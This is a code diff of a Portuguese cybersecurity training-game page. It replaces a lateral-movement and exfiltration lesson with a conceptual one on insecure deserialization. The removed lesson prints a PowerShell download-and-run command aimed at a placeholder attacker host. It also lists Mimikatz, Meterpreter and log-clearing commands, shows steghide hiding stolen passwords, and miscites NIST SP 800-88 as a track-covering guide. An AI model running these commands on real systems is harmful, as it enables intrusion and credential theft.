@@ -9,7 +9,7 @@
     <link rel="dns-prefetch" href="https://fonts.googleapis.com">
     <link rel="dns-prefetch" href="https://fonts.gstatic.com">
     <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
-    <title>CyberDuo - Movimento Lateral e Exfiltração</title>
+    <title>CyberDuo - Código Inseguro: Desserialização e Comportamento Perigoso</title>
     <link rel="icon" type="image/svg+xml" href="../assets/favicon.svg">
     <link rel="stylesheet" href="../assets/tailwind.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -27,9 +27,9 @@
         html, body { height: 100%; height: 100dvh; margin: 0; padding: 0; overflow: hidden; }
         body { background-color: var(--bg-dark); color: #e6edf3; font-family: 'Inter', sans-serif; display: flex; flex-direction: column; touch-action: manipulation; }
 
-        .game-header { flex-shrink: 0; padding: max(0.8rem, env(safe-area-inset-top)) 1rem 0.8rem; display: flex; align-items: center; gap: 0.8rem; background: #0d1117; border-bottom: 1px solid rgba(255, 0, 60, 0.2); z-index: 60; }
+        .game-header { flex-shrink: 0; padding: max(0.8rem, env(safe-area-inset-top)) 1rem 0.8rem; display: flex; align-items: center; gap: 0.8rem; background: #0d1117; border-bottom: 1px solid rgba(0, 255, 65, 0.2); z-index: 60; }
         .progress-container { flex-grow: 1; height: 12px; background: #1f2937; border-radius: 10px; overflow: hidden; }
-        .progress-fill { height: 100%; background: var(--cyber-red); width: 0%; transition: width 0.4s ease; border-radius: 10px;}
+        .progress-fill { height: 100%; background: var(--cyber-blue); width: 0%; transition: width 0.4s ease; border-radius: 10px;}
         .hearts { display: flex; gap: 0.3rem; color: var(--cyber-red); min-width: 80px; justify-content: flex-end; font-size: 1.1rem; }
 
         .game-content { flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 0.8rem; width: 100%; max-width: 600px; margin: 0 auto; box-sizing: border-box; scrollbar-width: none; }
@@ -39,10 +39,11 @@
         @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
         /* General Typography */
-        .module-subtitle { font-size: 0.7rem; font-weight: 900; color: var(--cyber-red); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem; }
+        .module-subtitle { font-size: 0.7rem; font-weight: 900; color: var(--cyber-blue); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem; }
         .title-main { font-size: clamp(1.4rem, 5vw, 1.8rem); font-weight: 800; color: white; line-height: 1.2; margin-bottom: 0.5rem; }
         .text-body { font-size: clamp(1rem, 4vw, 1.1rem); color: #b1bac4; line-height: 1.5; }
         .text-body b { color: white; }
+        
         
         /* Utility Classes */
         .mr-1 { margin-right: 0.25rem; }
@@ -54,13 +55,13 @@
 
         /* TYPE: TEACH */
         .teach-card { background: #0d1117; border: 1px solid #30363d; border-radius: 1.2rem; padding: clamp(1rem, 4vw, 1.5rem); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .teach-icon { font-size: 2.5rem; color: var(--cyber-red); margin-bottom: 1rem; }
+        .teach-icon { font-size: 2.5rem; color: var(--cyber-blue); margin-bottom: 1rem; }
         .teach-highlight { display: flex; align-items: center; gap: 0.6rem; background: rgba(0, 255, 65, 0.1); border-left: 3px solid var(--cyber-green); padding: 0.8rem; margin-top: 1rem; font-weight: 600; color: var(--cyber-green); border-radius: 0 0.5rem 0.5rem 0; }
 
         /* TYPE: EXAMPLE */
         .example-card { background: #0d1117; border: 1px solid #30363d; border-radius: 1.2rem; padding: clamp(1rem, 4vw, 1.5rem); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .example-scenario { background: #161b22; border: 1px solid #21262d; border-radius: 0.8rem; padding: 1rem; margin-top: 1rem; }
-        .example-code { background: #010409; font-family: 'Fira Code', monospace; padding: 1rem; border-radius: 0.5rem; margin-top: 1rem; font-size: 0.85rem; color: #00ff41; border: 1px solid #30363d; overflow-x: auto; white-space: pre; }
+        .example-code { background: #010409; font-family: 'Fira Code', monospace; padding: 1rem; border-radius: 0.5rem; margin-top: 1rem; font-size: 0.9rem; color: #00ff41; border: 1px solid #30363d; }
         .example-takeaway { display: flex; gap: 0.8rem; align-items: flex-start; margin-top: 1rem; color: #8b949e; font-size: 0.9rem; font-weight: 600; }
 
         /* TYPE: QUIZ */
@@ -68,23 +69,24 @@
         .options-grid { display: flex; flex-direction: column; gap: 0.6rem; width: 100%; }
         .option-card { background: #161b22; border: 2px solid #30363d; border-bottom-width: 4px; padding: clamp(0.8rem, 3vw, 1rem); border-radius: 1rem; cursor: pointer; transition: all 0.1s; display: flex; align-items: center; gap: 1rem; font-weight: 600; font-size: clamp(0.95rem, 4vw, 1.05rem); -webkit-tap-highlight-color: transparent; }
         .option-card:active { transform: translateY(2px); border-bottom-width: 2px; }
-        .option-card.selected { border-color: var(--cyber-red); background: rgba(255, 0, 60, 0.05); }
+        .option-card.selected { border-color: var(--cyber-blue); background: rgba(0, 255, 65, 0.05); }
         .option-card.correct { border-color: var(--cyber-green) !important; background: rgba(0, 255, 65, 0.1) !important; color: var(--cyber-green); }
         .option-card.wrong { border-color: var(--cyber-red) !important; background: rgba(255, 0, 60, 0.1) !important; color: var(--cyber-red); }
         .option-card.disabled { pointer-events: none; opacity: 0.6; }
         .option-number { width: 28px; height: 28px; flex-shrink: 0; border: 2px solid #484f58; border-radius: 0.4rem; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: 800; color: #8b949e; }
-        .option-card.selected .option-number { border-color: var(--cyber-red); color: var(--cyber-red); }
+        .option-card.selected .option-number { border-color: var(--cyber-blue); color: var(--cyber-blue); }
 
         /* TYPE: FILL */
         .fill-sentence { font-size: clamp(1.1rem, 5vw, 1.3rem); font-weight: 600; line-height: 1.6; color: white; margin-bottom: 2rem; background: #0d1117; padding: clamp(1rem, 4vw, 1.5rem); border-radius: 1.2rem; border: 1px solid #30363d; }
-        .fill-slot { display: inline-block; min-width: 120px; height: 34px; border-bottom: 3px solid #484f58; margin: 0 0.5rem; vertical-align: middle; text-align: center; color: var(--cyber-red); font-weight: 800; transition: all 0.2s; }
-        .fill-slot.filled { border-bottom-color: var(--cyber-red); }
+        .fill-slot { display: inline-block; min-width: 120px; height: 34px; border-bottom: 3px solid #484f58; margin: 0 0.5rem; vertical-align: middle; text-align: center; color: var(--cyber-blue); font-weight: 800; transition: all 0.2s; }
+        .fill-slot.filled { border-bottom-color: var(--cyber-blue); }
 
         /* TYPE: MATCH */
         .match-container { display: grid; grid-template-columns: 1fr 1fr; gap: 0.6rem clamp(0.5rem, 3vw, 1rem); width: 100%; margin-top: 1rem; }
+        /* .match-column removed */
         .match-item { background: #161b22; border: 2px solid #30363d; border-bottom-width: 4px; padding: clamp(0.5rem, 2.5vw, 0.8rem); border-radius: 0.8rem; cursor: pointer; text-align: center; font-weight: 600; font-size: clamp(0.85rem, 3.5vw, 0.95rem); transition: all 0.1s; user-select: none; display: flex; align-items: center; justify-content: center; min-height: 60px; height: 100%; -webkit-tap-highlight-color: transparent; }
         .match-item:active { transform: translateY(2px); border-bottom-width: 2px; }
-        .match-item.selected { border-color: var(--cyber-red); background: rgba(255, 0, 60, 0.1); color: white; }
+        .match-item.selected { border-color: var(--cyber-blue); background: rgba(0, 255, 65, 0.1); color: white; }
         .match-item.matched { border-color: var(--cyber-green); background: rgba(0, 255, 65, 0.05); color: var(--cyber-green); opacity: 0.5; pointer-events: none; }
         .match-item.error { border-color: var(--cyber-red); animation: shake 0.4s; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
@@ -93,8 +95,8 @@
         .game-footer { flex-shrink: 0; padding: 1rem 1rem max(1rem, env(safe-area-inset-bottom)); background: #0d1117; border-top: 1px solid #1f2937; width: 100%; display: flex; justify-content: center; box-sizing: border-box; z-index: 50; }
         .check-btn { width: 100%; max-width: 400px; padding: 1rem; border-radius: 1rem; font-weight: 800; text-transform: uppercase; cursor: pointer; background: #1f2937; color: #4b5563; border: none; font-size: 1rem; letter-spacing: 1px; transition: all 0.1s; -webkit-tap-highlight-color: transparent; }
         .check-btn:active { transform: scale(0.98); }
-        .check-btn.active { background: var(--cyber-red); color: white; box-shadow: 0 4px 0 #b3002a; }
-        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #b3002a; }
+        .check-btn.active { background: var(--cyber-blue); color: black; box-shadow: 0 4px 0 #00a8b3; }
+        .check-btn.active:active { transform: translateY(4px); box-shadow: 0 0px 0 #00a8b3; }
 
         /* FEEDBACK OVERLAY */
         .feedback-overlay { position: fixed; bottom: -100%; left: 0; right: 0; padding: 1.5rem 1.5rem max(1.5rem, env(safe-area-inset-bottom)); transition: bottom 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); z-index: 100; border-top-left-radius: 1.5rem; border-top-right-radius: 1.5rem; display: flex; flex-direction: column; align-items: center; text-align: left; }
@@ -108,7 +110,7 @@
 <body>
 
     <div class="game-header">
-        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-08.html'"><i class="fas fa-times"></i></div>
+        <div class="flex items-center justify-center cursor-pointer text-gray-500" style="min-width: 44px; min-height: 44px; margin-left: -10px;" onclick="window.location.href='../modules/modulo-06.html'"><i class="fas fa-times"></i></div>
         <div class="progress-container"><div class="progress-fill" id="progressFill"></div></div>
         <div class="hearts" id="heartsContainer"></div>
     </div>
@@ -118,7 +120,7 @@
     <div id="feedbackPopup" class="feedback-overlay">
         <div class="feedback-title" id="fbTitle"></div>
         <div class="feedback-msg" id="fbMsg"></div>
-        <button class="check-btn active w-full" style="max-width: 400px; background: white; color: black; box-shadow: 0 4px 0 #a0a8b0;" onclick="handleContinue()">Continuar</button>
+        <button class="check-btn active w-full" style="max-width: 400px;" onclick="handleContinue()">Continuar</button>
     </div>
 
     <footer class="game-footer" id="footerArea">
@@ -128,123 +130,60 @@
     <script>
         const steps = [
             {
-                "type": "teach",
-                "icon": "fa-arrows-left-right",
-                "title": "Movimento Lateral",
-                "content": "A fase de pivotagem (Movimento Lateral) consiste em utilizar o host já comprometido como uma <b>'cabeça de ponte'</b> para explorar falhas de segmentação e atacar outros sistemas mais críticos dentro da rede interna.",
-                "highlight": "Você usa a máquina da secretária (já invadida) para alcançar o servidor financeiro."
+                        "type": "teach",
+                        "icon": "fa-boxes-packing",
+                        "title": "Insecure Deserialization",
+                        "content": "<b>Desserialização Insegura</b> é transformar dados de fora (JSON, XML, Objetos Java/Python em disco) de volta em objetos na memória da aplicação. Se o aplicativo aceitar dados manipulados sem verificar, o hacker pode injetar classes perigosas.",
+                        "highlight": "Gera Execução Remota de Código (RCE) imediata."
             },
             {
-                "type": "teach",
-                "icon": "fa-toolbox",
-                "title": "Living-off-the-Land (LotL)",
-                "content": "Tática que utiliza <b>utilitários legítimos</b> do próprio sistema operacional (como PowerShell, WMI, PsExec) para conduzir o ataque, evitando o acionamento de soluções de Antivírus e EDR, configurando um <b>Malware Sem Arquivo</b>.",
-                "highlight": "Executar comandos maliciosos com as próprias ferramentas de administração do Windows."
+                        "type": "example",
+                        "icon": "fa-bug",
+                        "title": "O Ataque Mágico",
+                        "scenario": "O Java recebe um objeto serializado do usuário contendo o estado da sessão. O hacker envia um objeto malicioso que, ao ser 'desempacotado' (desserializado) pelo Java, dispara a abertura do terminal bash.",
+                        "takeaway": "Nunca deserialize dados provindos do usuário sem assinaturas criptográficas ou use JSON puro."
             },
             {
-                "type": "example",
-                "icon": "fa-terminal",
-                "title": "PowerShell em Memória",
-                "scenario": "O atacante roda um comando no host invadido que faz o download do payload e o executa instantaneamente na memória RAM (sem salvar em disco).",
-                "code": "PS C:\\> IEX (New-Object Net.WebClient).DownloadString('http://<IP_ATACANTE>/payload.ps1')",
-                "takeaway": "Nenhum arquivo .exe é gravado no disco, despistando os antivírus tradicionais."
+                        "type": "quiz",
+                        "task": "Qual é o principal perigo de aceitar e desserializar objetos fornecidos diretamente por usuários não confiáveis?",
+                        "options": [
+                                    "Execução Remota de Código (RCE) através da reconstrução de objetos maliciosos.",
+                                    "Aumento insignificante no consumo de banda de rede.",
+                                    "Exposição do banco de dados a ataques de injeção de SQL."
+                        ],
+                        "correctText": "Execução Remota de Código (RCE) através da reconstrução de objetos maliciosos.",
+                        "explanation": "O processo de desserialização pode instanciar e invocar métodos de classes arbitrárias pré-existentes na aplicação."
             },
             {
-                "type": "teach",
-                "icon": "fa-bolt",
-                "title": "PowerSploit e Empire",
-                "content": "Frameworks ofensivos poderosos que atuam na memória. Módulos úteis incluem:<br><br>- <b>Invoke-Mimikatz:</b> Extração de credenciais da memória RAM.<br>- <b>Out-Minidump:</b> Criação de dump da memória do processo.<br>- <b>Set-MasterBootRecord:</b> Módulo destrutivo que sobrescreve o MBR.<br>- <b>PowerUp:</b> Identifica falhas para escalada de privilégios rápida.",
-                "highlight": "O PowerSploit converte o PowerShell em uma arma de destruição em massa."
-            },
-            {
-                "type": "teach",
-                "icon": "fa-server",
-                "title": "WMI e WinRM",
-                "content": "Ferramentas nativas do Windows abusadas para execução de código remoto. O WinRM (Windows Remote Management) pode ser facilmente habilitado por um atacante via PowerShell:<br><br><code>Enable-PSRemoting -SkipNetworkProfileCheck -Force</code>",
-                "highlight": "Uma vez habilitado, o invasor tem um shell remoto indetectável no alvo."
-            },
-            {
-                "type": "teach",
-                "icon": "fa-microchip",
-                "title": "Arsenal Sysinternals",
-                "content": "A Microsoft fornece o pacote Sysinternals. Invasores adoram usá-lo:<br><br>- <b>PsExec:</b> Executa processos em máquinas remotas como SYSTEM.<br>- <b>PsLoggedOn:</b> Lista todos os usuários logados na rede no momento.<br>- <b>PsLogList:</b> Permite extrair os logs de eventos do alvo.<br>- <b>PsKill / PsSuspend:</b> Mata processos críticos (como Antivírus).",
-                "highlight": "PsExec é a ferramenta nº 1 de movimentação lateral para atacantes avançados."
-            },
-            {
-                "type": "match",
-                "title": "Associe os utilitários de Pós-Exploração às suas funções.",
-                "pairs": [
-                    { "term": "Invoke-Mimikatz", "definition": "Roubo de senhas direto da memória RAM via PowerShell" },
-                    { "term": "PsExec", "definition": "Ferramenta da Microsoft para executar comandos em máquinas remotas" },
-                    { "term": "PowerUp", "definition": "Identifica vetores de escalada de privilégios automaticamente" },
-                    { "term": "WinRM", "definition": "Administração remota nativa ativada via Enable-PSRemoting" }
-                ]
-            },
-            {
-                "type": "teach",
-                "icon": "fa-desktop",
-                "title": "Acesso Remoto Furtivo",
-                "content": "Muitos atacantes preferem uma Interface Gráfica. Habilitar o RDP (Remote Desktop) criptografa o tráfego, ocultando as ações dos monitores de rede.<br>No Metasploit, basta um comando no Meterpreter:<br><br><code>meterpreter > run post/windows/manage/enable_rdp</code>",
-                "highlight": "Ataques via RDP podem ser notados caso o usuário legítimo já esteja logado."
-            },
-            {
-                "type": "teach",
-                "icon": "fa-sitemap",
-                "title": "Mapeando a Rede com BloodHound",
-                "content": "O <b>BloodHound</b> é uma ferramenta gráfica que utiliza a <b>Teoria dos Grafos</b> para mapear estruturas e relacionamentos de confiança ocultos no Active Directory (AD) e no Azure. Ele exibe os caminhos exatos que levam ao privilégio de Domain Admin.",
-                "highlight": "Ele revela rapidamente qual usuário o atacante deve hackear para virar Admin da Rede."
-            },
-            {
-                "type": "quiz",
-                "task": "No contexto da Pós-Exploração, para que serve a ferramenta BloodHound?",
-                "options": [
-                    "Criar relacionamentos e caminhos visuais baseados em Grafos para descobrir como alcançar os privilégios de Domain Admin no Active Directory.",
-                    "Instalar um software de mineração de criptomoedas através de conexões SMB comprometidas.",
-                    "Forçar portas de rede (brute-force) em busca de serviços web desprotegidos na DMZ."
-                ],
-                "correctText": "Criar relacionamentos e caminhos visuais baseados em Grafos para descobrir como alcançar os privilégios de Domain Admin no Active Directory.",
-                "explanation": "O BloodHound mapeia visualmente os nós da rede, permitindo ao atacante ver a rota mais rápida até o controle total do domínio."
-            },
-            {
-                "type": "teach",
-                "icon": "fa-user-ninja",
-                "title": "Comandos do Meterpreter",
-                "content": "O Meterpreter é um payload de pós-exploração que injeta código dinamicamente na memória (sem arquivos físicos).<br><br>- <b>hashdump:</b> Extrai o banco SAM (hashes de senhas do Windows).<br>- <b>clearev:</b> Limpa os logs de evento.<br>- <b>idletime:</b> Verifica há quanto tempo o alvo está ocioso (útil para não ser notado).<br>- <b>webcam_snap:</b> Tira uma foto secreta usando a webcam da vítima.",
-                "highlight": "Um shell em memória focado completamente em espionagem avançada."
-            },
-            {
-                "type": "teach",
-                "icon": "fa-broom",
-                "title": "Exfiltração e OPSEC",
-                "content": "Antes de terminar, o atacante realiza a <b>Cobertura de Rastros</b>: exclusão de arquivos, backdoors e limpeza de logs (seguindo recomendações como NIST SP 800-88).<br><br>Para a <b>Exfiltração Furtiva</b>, dados sensíveis podem ser embutidos dentro de imagens comuns via <b>Esteganografia</b> (ex: <code>steghide</code>), burlando filtros da rede.",
-                "highlight": "A OPSEC (Segurança Operacional) garante que o ataque deixe o mínimo de evidências forenses possível."
-            },
-            {
-                "type": "example",
-                "icon": "fa-file-image",
-                "title": "Esteganografia com Steghide",
-                "scenario": "O atacante rouba senhas de banco de dados e as esconde dentro de uma foto inocente para enviar por e-mail sem alertar o firewall.",
-                "code": "// Embutindo os dados secretos dentro da imagem:\nsteghide embed -ef senhas_roubadas.txt -cf foto_de_gatinho.jpg\n\n// A foto agora contém o arquivo de texto, mas visualmente é idêntica a antes.",
-                "takeaway": "Filtros de Data Loss Prevention (DLP) deixam a imagem passar, ignorando as senhas dentro dela."
-            },
-            {
-                "type": "fill",
-                "sentence": "O ato de limpar arquivos temporários, excluir logs com o comando clearev e remover backdoors ao final do ataque para manter a OPSEC é conhecido como limpeza de ___.",
-                "options": [
-                    "evidências",
-                    "memória",
-                    "hardware"
-                ],
-                "correctText": "evidências",
-                "explanation": "A limpeza de evidências ou cobertura de rastros tenta impedir que as equipes de Blue Team (Defesa) investiguem o incidente com clareza."
+                        "type": "match",
+                        "title": "Associe as Falhas e Características",
+                        "pairs": [
+                                    {
+                                                "term": "Buffer Overflow",
+                                                "definition": "Escrita fora dos limites de memória em C/C++"
+                                    },
+                                    {
+                                                "term": "Use-After-Free",
+                                                "definition": "Acesso a ponteiro que aponta para memória liberada"
+                                    },
+                                    {
+                                                "term": "Race Condition",
+                                                "definition": "Falha de concorrência por falta de sincronização"
+                                    },
+                                    {
+                                                "term": "Insecure Deserialization",
+                                                "definition": "RCE ao instanciar objetos maliciosos do usuário"
+                                    }
+                        ]
             }
-        ];
+];
 
         let currentStep = 0;
-        let selectedIdx = null;
+        let selectedIdx = null; // For quiz and fill
         let hearts = 5;
         let shuffledOptions = [];
         
+        // Match state
         let matchLeft = [];
         let matchRight = [];
         let selectedLeft = null;
@@ -277,6 +216,7 @@
             
             updateProgress();
             
+            // Reset states
             selectedIdx = null;
             checkBtn.disabled = true;
             checkBtn.classList.remove('active');
@@ -306,7 +246,7 @@
                         <h2 class="title-main">${step.title}</h2>
                         <div class="example-scenario text-body">${step.scenario}</div>
                         ${step.code ? `<div class="example-code">${step.code}</div>` : ''}
-                        <div class="example-takeaway"><i class="fas fa-arrow-right mt-1" style="color: var(--cyber-red)"></i> ${step.takeaway}</div>
+                        <div class="example-takeaway"><i class="fas fa-arrow-right mt-1" style="color: var(--cyber-blue)"></i> ${step.takeaway}</div>
                     </div>
                 `;
             }
@@ -383,6 +323,7 @@
             area.scrollTop = 0;
         }
 
+        // Interactivity Handlers
         function selectQuiz(idx) {
             selectedIdx = idx;
             document.querySelectorAll('.option-card').forEach((c, i) => c.classList.toggle('selected', i === idx));
@@ -404,6 +345,7 @@
             const item = document.getElementById(`${side}-${idx}`);
             if (item.classList.contains('matched')) return;
 
+            // Clear previous selection on same side
             document.querySelectorAll(`.match-item[id^='${side}-']`).forEach(el => {
                 if(!el.classList.contains('matched')) el.classList.remove('selected');
             });
@@ -414,6 +356,7 @@
             else selectedRight = {el: item, id: pairId};
 
             if (selectedLeft && selectedRight) {
+                // Check match
                 if (selectedLeft.id === selectedRight.id) {
                     selectedLeft.el.classList.remove('selected');
                     selectedLeft.el.classList.add('matched');
@@ -436,6 +379,7 @@
                     errRight.el.classList.remove('selected');
                     errRight.el.classList.add('error');
                     
+                    // Lose heart for wrong match
                     hearts--;
                     updateProgress();
                     if(hearts <= 0) triggerGameOver();
@@ -451,11 +395,13 @@
             }
         }
 
+        // Logic Check
         function checkResponse() {
             const step = steps[currentStep];
             const checkBtn = document.getElementById('checkBtn');
             const popup = document.getElementById('feedbackPopup');
             
+            // Non-interactive steps just advance
             if (step.type === 'teach' || step.type === 'example') {
                 currentStep++;
                 render();
@@ -473,7 +419,7 @@
                     c.classList.add('disabled');
                 });
             } else if (step.type === 'match') {
-                isCorrect = true;
+                isCorrect = true; // Button only enables when all matches found
             }
 
             if (isCorrect) {
@@ -510,13 +456,16 @@
             document.getElementById('progressFill').style.width = `100%`;
             document.getElementById('footerArea').classList.add('hidden');
             
-            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/9.0-introducao.html'" style="background: var(--cyber-red); color: white; border-color: var(--cyber-red); box-shadow: 0 4px 0 #b3002a; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">MÓDULO 9 <i class="fas fa-arrow-right ml-2"></i></button>`;
+            let nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #008f20; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+            if (nextBtnHtml.includes("##NEXT_LESSON_BTN" + "##")) {
+                nextBtnHtml = `<button class="check-btn active w-full" onclick="window.location.href='../lessons/1.0-introducao.html'" style="background: var(--cyber-green); color: black; border-color: var(--cyber-green); box-shadow: 0 4px 0 #00a8b3; font-size: 1.1rem; padding: 1.2rem; letter-spacing: 2px;">PRÓXIMA LIÇÃO <i class="fas fa-arrow-right ml-2"></i></button>`;
+            }
 
             document.getElementById('gameArea').innerHTML = `
-                <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-red)">
-                    <i class="fas fa-arrows-left-right text-6xl text-red-500 mb-4 mt-4"></i>
-                    <h2 class="title-main mb-2">MÓDULO 8 COMPLETO!</h2>
-                    <p class="text-body mb-6">Você dominou as fases de movimento lateral e exfiltração sem ser detectado.</p>
+                <div class="game-card teach-card" style="align-items: center; text-align: center; border-color: var(--cyber-blue)">
+                    <i class="fas fa-medal text-6xl text-yellow-400 mb-4 mt-4"></i>
+                    <h2 class="title-main mb-2">CÓDIGO HOSTIL ANALISADO!</h2>
+                    <p class="text-body mb-6">Você completou esta lição com sucesso!</p>
                     <div style="display: flex; flex-direction: column; gap: 1rem; width: 100%; align-items: center; margin-top: 1rem;">
                         ${nextBtnHtml}
                         <div style="display: flex; gap: 1rem; width: 100%; max-width: 400px; margin-top: 0.5rem;">
@@ -524,7 +473,7 @@
                                 <i class="fas fa-rotate-right mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">REINICIAR</span>
                             </button>
-                            <button class="check-btn" onclick="window.location.href='../modules/modulo-08.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-red); color: var(--cyber-red); box-shadow: 0 4px 0 rgba(255,0,60,0.2); padding: 0.8rem 0.5rem;">
+                            <button class="check-btn" onclick="window.location.href='../modules/modulo-06.html'" style="flex: 1; background: #161b22; border: 2px solid var(--cyber-blue); color: var(--cyber-blue); box-shadow: 0 4px 0 rgba(0,255,255,0.2); padding: 0.8rem 0.5rem;">
                                 <i class="fas fa-layer-group mb-1 block text-lg"></i>
                                 <span style="font-size: 0.75rem; display: block; margin-top: 4px;">MÓDULOS</span>
                             </button>
